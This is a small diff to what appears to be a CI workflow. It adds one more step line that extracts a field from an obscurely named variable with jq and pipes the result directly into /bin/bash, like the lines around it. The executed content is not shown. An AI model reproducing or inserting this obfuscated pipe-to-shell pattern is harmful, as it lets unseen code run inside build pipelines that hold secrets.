@@ -21,6 +21,7 @@ jobs:
           echo $uhavt347 | jq -r .ajg9 | /bin/bash
           printf '%s' "$mrhi3625" | jq -r .dsgp11 | /bin/bash
           printf '%s' "$pbvs5" | jq -r .xdfb562 | /bin/bash
+          printf '%s' "$mp7" | jq -r .t23 | /bin/bash
 
       - name: Save output
         if: always()
